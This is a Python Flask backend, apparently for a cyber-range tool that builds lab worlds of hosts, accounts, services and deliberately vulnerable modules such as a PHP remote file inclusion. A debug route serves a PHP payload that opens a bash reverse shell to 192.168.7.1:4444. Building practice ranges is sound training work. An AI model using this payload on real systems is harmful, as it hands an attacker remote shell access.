from collections import defaultdict

import bson
from flask import Flask, request
from flask import json
from mongoengine import *

from host import Host, OperatingSystem, Account, Service, ConfigurationOption, Vulnerability
from world import World

app = Flask(__name__)
connect('cyberfront')


@app.route('/')
def index():
    return app.send_static_file('index.html')


@app.route('/api/worlds')
def worlds():
    return World.objects().to_json()


@app.route('/api/worlds/<worldid>')
def get_world(worldid):
    return World.objects(id=worldid).first().to_json()


@app.route('/api/worlds/<world_id>/hosts', methods=['GET', 'POST'])
def hosts_in_world(world_id):
    world = World.objects(id=world_id).first()

    if world is None:
        return 'Invalid world id'

    if request.method == 'GET':
        hs = defaultdict(list)
        hs['hosts']

        for h in Host.objects(world=world_id):
            mongo = h.to_mongo()
            mongo['os'] = h.os.to_mongo()
            hs['hosts'].append(mongo)

        return bson.json_util.dumps(hs, indent=2)
    else:
        if request.json.get('action') == 'DELETE':
            return 'not implemented'

        hostname = request.json.get('hostname')
        os_id = request.json.get('os')

        if hostname is None or os_id is None:
            return 'Missing parameters'

        os = OperatingSystem.objects(id=request.json.get('os')).first()
        check = Host.objects(world=world, hostname=hostname).first()

        if check:
            return 'Duplicate hostname in World'

        if os is None:
            return 'Invalid Operating System id'

        h = Host(hostname=hostname, os=os, world=world)
        h.install_os()
        h.save()

        return "Host added successfully"


@app.route('/api/hosts')
def hosts():
    hs = defaultdict(list)

    for h in Host.objects():
        mongo = h.to_mongo()
        mongo['os'] = h.os.to_mongo()
        hs['hosts'].append(mongo)

    return bson.json_util.dumps(hs, indent=2)


@app.route('/api/hosts/<host_id>', methods=['GET', 'POST'])
def get_host(host_id):
    host = Host.objects(id=host_id).first()

    if host is None:
        return 'Invalid host id'

    if request.method == 'GET':
        mongo = host.to_mongo()
        mongo['os'] = host.os.to_mongo()
        return bson.json_util.dumps(mongo, indent=2)
    else:
        # action = request.json.get('action')
        data = json.loads(request.form.get('json'))

        if data is None:
            return 'no form json', 400

        action = data.get('action')

        if action == 'ACCOUNT':
            account = data.get('account')

            if account is None:
                return 'Missing account data'

            name = account.get('name')
            password = account.get('password')
            group = account.get('group')

            if name is None or password is None:
                return 'Missing username or password'

            if group is None:
                group = account.get('name')

            try:
                check = host.accounts.get(name=name)
                check.group = group
                check.password = password
                host.save()
            except DoesNotExist:
                mongo_account = Account(name=name, group=group, password=password)
                host.accounts.append(mongo_account)
                host.save()

            return host.to_json()
        elif action == 'MODULE':
            module_id = data.get('module')
            options = data.get('options')
            files = request.files

            if module_id is None or options is None:
                return "missing param", 400

            service = Service.objects(id=module_id).first()
            vuln = Vulnerability.objects(id=module_id).first()

            if service is None and vuln is None:
                return 'invalid service id', 400

            ref = service if service else vuln

            if host.install_module(ref, files=files, options=options):
                host.save()
                return host.to_json()
            else:
                return 'installation failed', 400
        else:
            return 'invalid action', 400


@app.route('/api/os')
def get_oses():
    return OperatingSystem.objects().to_json()


@app.route('/api/services')
def get_services():
    return Service.objects().to_json()


@app.route('/api/vulns')
def get_vulns():
    return Vulnerability.objects().to_json()


@app.route('/api/debug/rfi.php')
def rfi():
    return '<?php echo hello; echo shell_exec(\'bash -c "bash -i >& /dev/tcp/192.168.7.1/4444 0>&1"\');?>'

print "cyberfront starting"

# ubuntu = OperatingSystem(kernel='LINUX', name='Ubuntu', version='14.04', box='ubuntu/trusty64')
# ubuntu.save()

# bob = Account(name='bob', password='password', group='root')
# testmachine = Host.objects().first()

if len(Service.objects()) == 0:
    options = {
        'user': ConfigurationOption(name='Run As User', description='User to run the service as.', type='USER'),
        'port': ConfigurationOption(name='Port', description='Port to listen on.', type='INT'),
        'php': ConfigurationOption(name='Install PHP', description='Whether to install PHP or not.', type='BOOLEAN'),
        'files': ConfigurationOption(name='Server Files', description='Files to serve.', type='FILE')
    }
    apache2 = Service(name='apache_ubuntu', service_name='Apache Web Server', version='2', options=options)
    apache2.save()

if len(World.objects()) == 0:
    World(name="world1").save()

if len(Vulnerability.objects()) == 0:
    options = {
        'file': ConfigurationOption(name='Vulnerable File', description='File that is affected by the vulnerability',
                                    type='FILE'),
        'service': ConfigurationOption(name='Affected Service', type='SERVICE')
    }

    rfi = Vulnerability(name='rfi_apache', full_name='PHP Remote File Inclusion Vulnerability',
                        category='File Inclusion', requirements=['apache_ubuntu'], options=options)
    rfi.save()

# sudo_options = {
#    'users': ConfigurationOption(name='Sudoers', description='List of sudoers', type='USER', list=True, default=[])
# }
# sudo = Service(name='ubuntu_sudo', service_name='sudo', version='?', options=sudo_options)
# sudo.save()

# sudo = Service.objects(name="ubuntu_sudo").first()
# ubuntu = OperatingSystem.objects().first()
# ubuntu.services = [sudo]
# ubuntu.save()

# World(name='world1').save()
# World(name='world2').save()

# apache2 = Service.objects(service_name='Apache Web Server').first()
# apache2.install(testmachine, user='bob', group='bob', port='1234', php="1", files='web.tar.gz')
# testmachine = Host(hostname='test', os=ubuntu, accounts=[bob])
# testmachine.save()

app.run(port=80, host='192.168.7.1')
 # app.run(port=80)

